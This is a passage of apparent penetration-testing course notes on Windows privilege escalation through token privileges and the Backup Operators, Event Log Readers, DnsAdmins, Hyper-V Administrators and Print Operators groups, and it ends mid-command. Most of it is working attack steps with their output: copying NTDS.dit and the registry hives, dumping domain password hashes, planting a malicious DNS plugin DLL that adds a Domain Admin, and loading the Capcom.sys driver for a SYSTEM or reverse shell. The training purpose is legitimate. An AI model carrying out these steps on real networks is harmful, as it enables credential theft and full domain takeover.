Here we can target `winlogon.exe` running under PID 612, which we know runs as SYSTEM on Windows hosts.

![PowerShell window running script to start cmd.exe as NT AUTHORITYYSTEM. Command prompt shows successful execution with SYSTEM privileges.](/resources/psgetsys_winlogon.png)

We could also use the [Get-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2) cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script, cutting down on the number of steps required.

![PowerShell script running to start cmd.exe as NT AUTHORITYYSTEM. Command prompt confirms execution with SYSTEM privileges.](/resources/psgetsys_lsass.png)

Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`. Often we will not have RDP access to a host, so we'll have to modify our PoCs to either return a reverse shell to our attack host as SYSTEM or another command, such as adding an admin user. Play around with these PoCs and see what other ways you can achieve SYSTEM access, especially if you do not have a fully interactive session, such as when you achieve command injection or have a web shell or reverse shell connection as the user with `SeDebugPrivilege`. Keep these examples in mind in case you ever run into a situation where dumping LSASS does not result in any useful credentials (though we can get SYSTEM access with just the machine NTLM hash, but that's outside the scope of this module) and a shell or RCE as SYSTEM would be beneficial.

&nbsp;

&nbsp;

&nbsp;

## Leveraging the Privilege

#### Reviewing Current User Privileges

Let's review our current user's privileges.

SeTakeOwnershipPrivilege

```powershell-session
PS C:\local> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

&nbsp;

&nbsp;

#### Enabling SeTakeOwnershipPrivilege

Notice from the output that the privilege is not enabled. We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.

SeTakeOwnershipPrivilege

```powershell-session
PS C:\local> Import-Module .\Enable-Privilege.ps1
PS C:\local> .\EnableAllTokenPrivs.ps1
PS C:\local> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

&nbsp;

&nbsp;

&nbsp;

```powershell-session
PS C:\local> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
 
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\local-student".
```

&nbsp;

&nbsp;

Let's grant our user full privileges over the target file.

SeTakeOwnershipPrivilege

```powershell-session
PS C:\local> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant local-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

&nbsp;

&nbsp;

## When to Use?

#### Files of Interest

Some local files of interest may include:

SeTakeOwnershipPrivilege

```shell-session
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

&nbsp;

# Windows Built-in Groups

&nbsp;

| | |  
| --- | --- | --- |  
| [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators) | [Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders) | [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins) |  
| [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators) | [Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators) | [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) |

&nbsp;

#### Verifying SeBackupPrivilege is Enabled

Let's check if `SeBackupPrivilege` is enabled by invoking `whoami /priv` or `Get-SeBackupPrivilege` cmdlet. If the privilege is disabled, we can enable it with `Set-SeBackupPrivilege`.

Note: Based on the server's settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.

```powershell-session
PS C:\local> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

&nbsp;

&nbsp;

#### Importing Libraries

```powershell-session
PS C:\local> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\local> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

&nbsp;

&nbsp;

#### Copying a Protected File

```powershell-session
PS C:\local> Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Copied 88 bytes


PS C:\local>  cat .\Contract.txt

Inlanefreight 2021 Contract

==============================

Board of Directors:
```

&nbsp;

&nbsp;

&nbsp;

#### Copying NTDS.dit Locally

```powershell-session
PS C:\local> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\local> dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

#### Copying NTDS.dit Locally

Next, we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally.

```powershell-session
PS C:\local> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copied 16777216 bytes
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

#### Backing up SAM and SYSTEM Registry Hives

The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`

```cmd-session
C:\local> reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\local> reg save HKLM\SAM SAM.SAV

The operation completed successfully
```

&nbsp;

&nbsp;

&nbsp;

#### Extracting Credentials from NTDS.dit

With the NTDS.dit extracted, we can use a tool such as `secretsdump.py` or the PowerShell `DSInternals` module to extract all Active Directory account credentials. Let's obtain the NTLM hash for just the `administrator` account for the domain using `DSInternals`.

```powershell-session
PS C:\local> Import-Module .\DSInternals.psd1
PS C:\local> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\local> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
Sid: S-1-5-21-669053619-2741956077-1013132368-500
Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
SamAccountName: Administrator
SamAccountType: User
UserPrincipalName:
PrimaryGroupId: 513
SidHistory:
Enabled: True
UserAccountControl: NormalAccount, PasswordNeverExpires
AdminCount: True
Deleted: False
LastLogonDate: 5/6/2021 5:40:30 PM
DisplayName:
GivenName:
Surname:
Description: Built-in account for administering the computer/domain
ServicePrincipalName:
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-669053619-2741956077-1013132368-512
Secrets
  NTHash: cf3a5525ee9414229e66279623ed5c58
  LMHash:
  NTHashHistory:
  LMHashHistory:
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: d60dfbbf20548938
      OldCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 94c300d0e47775b407f2496a5cca1a0a
          Iterations: 4096
        DES_CBC_MD5
          Key: d60dfbbf20548938
          Iterations: 4096
      OldCredentials:
      OlderCredentials:
      ServiceCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:
```

#### Extracting Hashes Using SecretsDump

We can also use `SecretsDump` offline to extract hashes from the `ntds.dit` file obtained earlier. These can then be used for pass-the-hash to access additional resources or cracked offline using `Hashcat` to gain further access. If cracked, we can also present the client with password cracking statistics to provide them with detailed insight into overall password strength and usage within their domain and provide recommendations for improving their password policy (increasing minimum length, creating a dictionary of disallowed words, etc.).

```shell-session
[!bash!]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
local-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::

<SNIP>
```

* * *

## Robocopy

#### Copying Files with Robocopy

The built-in utility [robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) can be used to copy files in backup mode as well. Robocopy is a command-line directory replication tool. It can be used to create backup jobs and includes features such as multi-threaded copying, automatic retry, the ability to resume copying, and more. Robocopy differs from the `copy` command in that instead of just copying all files, it can check the destination directory and remove files no longer in the source directory. It can also compare files before copying to save time by not copying files that have not been changed since the last copy/backup job ran.

```cmd-session
C:\local> robocopy /B E:\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, May 6, 2021 1:11:47 PM
   Source : E:\Windows\NTDS\
     Dest : C:\Tools\ntds\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    E:\Windows\NTDS\
100%        New File              16.0 m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           356962042 Bytes/sec.
   Speed :           20425.531 MegaBytes/min.
   Ended : Thursday, May 6, 2021 1:11:47 PM
```

This eliminates the need for any external tools.

&nbsp;

&nbsp;

# Event Log Readers

&nbsp;

#### Confirming Group Membership

Event Log Readers

```cmd-session
C:\local> net localgroup "Event Log Readers"

Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully
```

&nbsp;

&nbsp;

#### Searching Security Logs Using wevtutil

Event Log Readers

```powershell-session
PS C:\local> wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

&nbsp;

&nbsp;

&nbsp;

#### Passing Credentials to wevtutil

Event Log Readers

```cmd-session
C:\local> wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

&nbsp;

&nbsp;

#### Searching Security Logs Using Get-WinEvent

Event Log Readers

```powershell-session
PS C:\local> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

# DnsAdmins

&nbsp;

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll
```

&nbsp;

#### Loading DLL as Non-Privileged User

DnsAdmins

```cmd-session
C:\local> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

As expected, attempting to execute this command as a normal user isn't successful. Only members of the `DnsAdmins` group are permitted to do this.

#### Loading DLL as Member of DnsAdmins

DnsAdmins

```powershell-session
C:\local> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109
```

#### Loading Custom DLL

After confirming group membership in the `DnsAdmins` group, we can re-run the command to load a custom DLL.

DnsAdmins

```cmd-session
C:\local> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

Note: We must specify the full path to our custom DLL or the attack will not work properly.

Only the `dnscmd` utility can be used by members of the `DnsAdmins` group, as they do not directly have permission on the registry key.

With the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.

After restarting the DNS service (if our user has this level of access), we should be able to run our custom DLL and add a user (in our case) or get a reverse shell. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let's check our current user's permissions on the DNS service.

#### Finding User's SID

First, we need our user's SID.

DnsAdmins

```cmd-session
C:\local> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

#### Checking Permissions on DNS Service

Once we have the user's SID, we can use the `sc` command to check permissions on the service. Per this [article](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/), we can see that our user has `RPWP` permissions which translate to `SERVICE_START` and `SERVICE_STOP`, respectively.

DnsAdmins

```cmd-session
C:\local> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

Check out the `Windows Fundamentals` module for an explanation of SDDL syntax in Windows.

#### Stopping the DNS Service

After confirming these permissions, we can issue the following commands to stop and start the service.

DnsAdmins

```cmd-session
C:\local> sc stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
```

The DNS service will attempt to start and run our custom DLL, but if we check the status, it will show that it failed to start correctly (more on this later).

#### Starting the DNS Service

DnsAdmins

```cmd-session
C:\local> sc start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 6960
        FLAGS              :
```

#### Confirming Group Membership

If all goes to plan, our account will be added to the Domain Admins group or receive a reverse shell if our custom DLL was made to give us a connection back.

DnsAdmins

```cmd-session
C:\local> net group "Domain Admins" /dom

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

* * *

## Cleaning Up

Making configuration changes and stopping/restarting the DNS service on a Domain Controller are very destructive actions and must be exercised with great care. As a penetration tester, we need to run this type of action by our client before proceeding with it since it could potentially take down DNS for an entire Active Directory environment and cause many issues. If our client gives their permission to go ahead with this attack, we need to be able to either cover our tracks and clean up after ourselves or offer our client steps on how to revert the changes.

These steps must be taken from an elevated console with a local or domain admin account.

#### Confirming Registry Key Added

The first step is confirming that the `ServerLevelPluginDll` registry key exists. Until our custom DLL is removed, we will not be able to start the DNS service again correctly.

DnsAdmins

```cmd-session
C:\local> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    adduser.dll
```

#### Deleting Registry Key

We can use the `reg delete` command to remove the key that points to our custom DLL.

DnsAdmins

```cmd-session
C:\local> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
```

#### Starting the DNS Service Again

Once this is done, we can start up the DNS service again.

DnsAdmins

```cmd-session
C:\local> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4984
        FLAGS              :
```

#### Checking DNS Service Status

If everything went to plan, querying the DNS service will show that it is running. We can also confirm that DNS is working correctly within the environment by performing an `nslookup` against the localhost or another host in the domain.

DnsAdmins

```cmd-session
C:\local> sc query dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
```

&nbsp;

&nbsp;

&nbsp;

&nbsp;

# Hyper-V Administrators

* * *

The [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) group has full access to all [Hyper-V features](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines). If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.

It is also well documented on this [blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), that upon deleting a virtual machine, `vmms.exe` attempts to restore the original file permissions on the corresponding `.vhdx` file and does so as `NT AUTHORITY\SYSTEM`, without impersonating the user. We can delete the `.vhdx` file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to.

If the operating system is vulnerable to [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) or [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.

#### Target File

An example of this is Firefox, which installs the `Mozilla Maintenance Service`. We can update [this exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (a proof-of-concept for NT hard link) to grant our current user full permissions on the file below:

Hyper-V Administrators

```shell-session
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

#### Taking Ownership of the File

After running the PowerShell script, we should have full control of this file and can take ownership of it.

Hyper-V Administrators

```cmd-session
C:\local> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

#### Starting the Mozilla Maintenance Service

Next, we can replace this file with a malicious `maintenanceservice.exe`, start the maintenance service, and get command execution as SYSTEM.

Hyper-V Administrators

```cmd-session
C:\local> sc.exe start MozillaMaintenance
```

Note: This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.

[Previous](https://academy.hackthebox.com/module/67/section/603)

&nbsp;

&nbsp;

&nbsp;

&nbsp;

# Print Operators

* * *

[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. If we issue the command `whoami /priv`, and don't see the `SeLoadDriverPrivilege` from an unelevated context, we will need to bypass UAC.

#### Confirming Privileges

Print Operators

```cmd-session
C:\local> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled
```

#### Checking Privileges Again

The [UACMe](https://github.com/hfiref0x/UACME) repo features a comprehensive list of UAC bypasses, which can be used from the command line. Alternatively, from a GUI, we can open an administrative command shell and input the credentials of the account that is a member of the Print Operators group. If we examine the privileges again, `SeLoadDriverPrivilege` is visible but disabled.

Print Operators

```cmd-session
C:\local> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================  ==========
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

It's well known that the driver `Capcom.sys` contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use [this](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to load the driver. The PoC enables the privilege as well as loads the driver for us.

Download it locally and edit it, pasting over the includes below.

Code: c

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

Next, from a Visual Studio 2019 Developer Command Prompt, compile it using **cl.exe**.

#### Compile with cl.exe

Print Operators

```cmd-session
C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.28.29913.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj
```

#### Add Reference to Driver

Next, download the `Capcom.sys` driver from [here](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys), and save it to `C:\temp`. Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.

Print Operators

```cmd-session
C:\local> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

The operation completed successfully.


C:\local> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.
```

The odd syntax `\??\` used to reference our malicious driver's ImagePath is an [NT Object Path](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c). The Win32 API will parse and resolve this path to properly locate and load our malicious driver.

#### Verify Driver is not Loaded

Using Nirsoft's [DriverView.exe](http://www.nirsoft.net/utils/driverview.html), we can verify that the Capcom.sys driver is not loaded.

Print Operators

```powershell-session
PS C:\local> .\DriverView.exe /stext drivers.txt
PS C:\local> cat drivers.txt | Select-String -pattern Capcom
```

#### Verify Privilege is Enabled

Run the `EnableSeLoadDriverPrivilege.exe` binary.

Print Operators

```cmd-session
C:\local> EnableSeLoadDriverPrivilege.exe

whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0
```

#### Verify Capcom Driver is Listed

Next, verify that the Capcom driver is now listed.

Print Operators

```powershell-session
PS C:\local> .\DriverView.exe /stext drivers.txt
PS C:\local> cat drivers.txt | Select-String -pattern Capcom

Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys
```

#### Use ExploitCapcom Tool to Escalate Privileges

To exploit the Capcom.sys, we can use the [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) tool after compiling with it Visual Studio.

Print Operators

```powershell-session
PS C:\local> .\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
```

This launches a shell with SYSTEM privileges.

![Command prompt running as NT AUTHORITYYSTEM. PowerShell shows Capcom.sys driver identified and ExploitCapcom.exe executed, resulting in successful token stealing and SYSTEM shell launch.](/resources/capcomexploit.png)

* * *

## Alternate Exploitation - No GUI

If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `"C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.

Code: c

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

The `CommandLine` string in this example would be changed to:

Code: c

```c
  TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

We would set up a listener based on the `msfvenom` payload we generated and hopefully receive a reverse shell connection back when executing `ExploitCapcom.exe`. If a reverse shell connection is blocked for some reason, we can try a bind shell or exec/add user payload.

* * *

## Automating the Steps

#### Automating with EopLoadDriver

We can use a tool such as [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) to automate the process of enabling the privilege, creating the registry key, and executing `NTLoadDriver` to load the driver. To do this, we would run the following:

Print Operators

```cmd-session
C:\local> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

